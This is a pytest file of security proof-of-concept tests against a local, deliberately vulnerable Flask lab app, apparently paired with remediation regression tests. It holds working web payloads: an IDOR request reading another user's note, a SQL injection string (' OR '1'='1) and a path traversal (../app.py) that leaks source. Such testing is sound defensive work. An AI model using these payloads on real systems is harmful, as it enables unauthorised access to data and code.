"""Security PoCs — run against the VULNERABLE app, expect flaws present.

Each test documents the flaw with the minimum request necessary.
After applying remediation/FINDING-00*, the matching regression test in
tests/regression/ must pass instead.
Target: local Flask on 127.0.0.1:5000 (see conftest.py fixture).
"""
import os
import requests

BASE = os.environ.get("LAB_BASE_URL", "http://127.0.0.1:5000")


def test_001_idor_bob_note_readable_by_alice():
    """FINDING-001: /note/3 (bob's) is returned to alice without any check."""
    r = requests.get(f"{BASE}/note/3", params={"as": "alice"}, timeout=5)
    assert r.status_code == 200, "expected vulnerable app to expose note 3"
    assert r.json()["owner"] == "bob"


def test_002_search_sqli_returns_all_rows():
    """FINDING-002: search?q=' OR '1'='1 returns rows regardless of filter."""
    r = requests.get(f"{BASE}/search", params={"q": "' OR '1'='1", "as": "alice"}, timeout=5)
    assert r.status_code == 200
    assert len(r.json()) >= 3, "injection did not widen the query"


def test_003_download_traversal_leaks_source():
    """FINDING-003: /download?f=../app.py escapes the files/ directory."""
    r = requests.get(f"{BASE}/download", params={"f": "../app.py"}, timeout=5)
    assert r.status_code == 200, "expected traversal to succeed on vulnerable app"
    assert "FINDING-003" in r.text
